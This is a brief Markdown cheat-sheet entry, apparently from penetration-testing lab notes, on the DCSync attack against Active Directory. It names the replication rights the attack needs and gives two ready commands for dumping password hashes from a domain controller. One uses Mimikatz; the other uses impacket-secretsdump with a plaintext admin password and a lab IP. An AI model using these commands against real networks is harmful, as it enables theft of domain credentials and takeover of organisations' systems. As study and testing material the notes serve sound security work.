# DCSync

Abuses AD replication rights to request password hashes from the DC as if you were another DC.

**Required rights:** Replicating Directory Changes + Replicating Directory Changes All (default: Domain Admins, Enterprise Admins, Administrators).

```cmd
# Via Mimikatz
lsadump::dcsync /user:corp\dave

# Via impacket
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
